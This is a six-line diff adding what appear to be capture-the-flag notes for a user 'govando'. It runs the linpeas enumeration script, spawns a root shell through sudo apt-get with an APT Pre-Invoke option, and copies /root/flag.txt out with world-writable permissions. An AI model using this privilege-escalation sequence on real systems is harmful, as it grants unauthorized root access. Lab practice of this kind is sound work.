@@ -1,0 +1,6 @@
+usuario: govando
+sh linpeas.sh -a -e -r
+sudo apt-get -o APT::Update::Pre-Invoke::=/bin/bash
+cp /root/flag.txt /home/govando
+chmod 666 /home/govando/flag.txt
+
